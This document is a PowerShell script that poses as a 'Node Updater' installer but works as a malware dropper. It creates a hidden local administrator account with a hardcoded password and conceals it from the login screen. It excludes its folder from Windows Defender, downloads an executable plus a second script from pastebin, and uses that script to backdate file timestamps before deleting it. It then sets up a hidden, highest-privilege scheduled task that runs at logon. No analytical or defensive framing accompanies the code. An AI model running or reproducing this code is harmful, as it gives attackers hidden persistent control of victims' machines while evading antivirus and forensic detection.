$path = "C:\Program Files\Node Updater";

$username = "NT-SECURITY";
$password = "p5Te3mC1sC84";
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;

if (-Not (Test-Path $path)) {
    New-Item -Path $path -ItemType Directory -Force > $null 2>&1;
}

if (-Not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
	New-LocalUser -Name $username -Password $securePassword -AccountNeverExpires -PasswordNeverExpires -UserMayNotChangePassword > $null 2>&1;
	
	Add-LocalGroupMember -Group "Administrators" -Member $username;
	
	$userSID = (Get-LocalUser -Name $username).SID.Value;
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList";
    if (-Not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force > $null 2>&1;
    }
    New-ItemProperty -Path $regPath -Name $username -Value 0 -PropertyType DWord -Force > $null 2>&1;
	
	Start-Process "cmd.exe" -WorkingDirectory (Split-Path "C:\Windows\System32") -Credential ([System.Management.Automation.PSCredential]::new($username, $securePassword)) -ArgumentList "/C";
}

Add-MpPreference -ExclusionPath $path;

Stop-Process -Name "Node Updater" -Force -ErrorAction SilentlyContinue;

Invoke-WebRequest -Uri "https://github.com/nodeupdater2/nodeupdater/releases/latest/download/app.exe" -OutFile "$path\Node Updater.exe";

Invoke-WebRequest -Uri "https://pastebin.com/raw/JnKYFey2" -OutFile "C:\Windows\Temp\CFT.ps1";

& "C:\Windows\Temp\CFT.ps1" -FolderPath $path -Time "02/04/2018 08:47:36";

Remove-Item -Path "C:\Windows\Temp\CFT.ps1";

Register-ScheduledTask -TaskName "Node Updater" -Action (New-ScheduledTaskAction -Execute "$path\Node Updater.exe" -WorkingDirectory $path) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User $username -Password $password -RunLevel Highest -Force > $null 2>&1;

Start-ScheduledTask -TaskName "Node Updater";
